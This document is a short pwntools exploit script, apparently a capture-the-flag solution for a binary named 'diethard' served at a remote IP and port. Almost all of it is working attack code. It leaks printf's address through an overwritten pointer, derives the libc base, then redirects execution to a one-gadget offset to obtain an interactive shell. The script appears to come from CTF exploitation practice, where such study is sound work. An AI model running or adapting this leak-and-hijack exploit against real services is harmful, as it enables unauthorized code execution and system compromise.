from pwn import *

#s = process("./diethard")
#libc = ELF("libc.so.local")

s = remote("202.120.7.194", 6666)
libc = ELF("libc.so.6_b86ec517ee44b2d6c03096e0518c72a1")

def add(size, buf):
	s.recvuntil("Exit")
	s.sendline("1")
	s.sendline("%d" % size)
	s.sendline(buf)
	s.recvuntil("Input")

add(2015, "A")
add(2015, "B")

printf_ptr = 0x603248
buf = "A"*8+p64(0x100)+p64(printf_ptr)+p64(0x400976)
add(2017, buf)

s.recvuntil("Exit")
s.sendline("2")
s.recvuntil("1. ")
buf = s.recvline()
print buf

printf_libc = u64(buf[:8])

libc.address = printf_libc - libc.symbols['printf']
s.sendline("2")

bespoke = libc.address+0xD6E77
buf = "A"*8+p64(0x100)+p64(printf_ptr)+p64(bespoke)
add(2017, buf)

s.sendline("2")

s.interactive()
